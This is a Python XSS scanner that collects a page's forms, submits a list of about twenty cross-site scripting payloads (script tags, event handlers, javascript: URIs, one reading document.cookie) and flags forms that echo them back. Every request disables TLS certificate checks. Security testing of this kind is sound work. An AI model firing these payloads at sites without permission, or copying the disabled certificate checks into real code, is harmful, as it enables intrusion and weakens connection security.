# xss.py

import requests
from bs4 import BeautifulSoup as bsoup
from urllib.parse import urljoin
import ssl

def get_forms(url):
    beaSoup = bsoup(requests.get(url, verify=False).content, "html.parser")
    return beaSoup.find_all("form")

def get_fdetails(form):
    details = {}
    
    action = form.attrs.get("action")
    if action is not None:
        action = action.lower()
    
    method = form.attrs.get("method", "get").lower()
   
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        inputs.append({"type": input_type, "name": input_name})
  
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

def form_submit(form_details, url, value):
    target_url = urljoin(url, form_details["action"])
    
    inputs = form_details["inputs"]
    data = {}
    for input in inputs:
        if input["type"] == "text" or input["type"] == "search":
            input["value"] = value
        input_name = input.get("name")
        input_value = input.get("value")
        if input_name and input_value:
            data[input_name] = input_value

    if form_details["method"] == "post":
        return requests.post(target_url, data=data, verify=False)
    else:
        # GET request
        return requests.get(target_url, params=data, verify=False)

def xss_scan(url):
    forms = get_forms(url)
    messages = []

    messages.append(f"Detected {len(forms)} forms on {url}.")
    
    xss_attacks = [
        "<Script>alert('hi')</scripT>",
        "<img src='x' onerror='alert(\"hi\")'>",
        "<svg/onload=alert('hi')>",
        "<body onload=alert('hi')>",
        "<iframe src=\"javascript:alert('hi');\"></iframe>",
        "<a href=\"javascript:alert('hi');\">Click me</a>",
        "<script>alert(document.cookie)</script>",
        "'\"><script>alert('hi')</script>",
        "<sCrIpt>alert('hi')</sCrIpt>",
        "<img src=x onerror=alert('hi')>",
        "<svg/onload=alert('hi')>",
        "<img src=javascript:alert('hi')>",
        "<img src=JaVaScRiPt:alert('hi')>",
        "<iframe src=javascript:alert('hi')></iframe>",
        "<a href=javascript:alert('hi')>Click me</a>",
        "<body/onload=alert('hi')>",
        "<img src=x:alert('hi')>",
        "<input type=\"image\" src=\"\" onerror=\"alert('hi')\">",
        "<input type=\"text\" onfocus=\"alert('hi')\">",
    ]
    
    is_vulnerable = False

    for form in forms:
        form_details = get_fdetails(form)
        for attack in xss_attacks:
            content = form_submit(form_details, url, attack).content.decode()
            if attack in content:
                messages.append(f"XSS Detected on {url}")
                messages.append("THIS IS VULNERABLE FOR XSS ATTACKS")
                is_vulnerable = True
        
    response = {
        "is_vulnerable": is_vulnerable,
        "messages": messages
    }
    
    return response


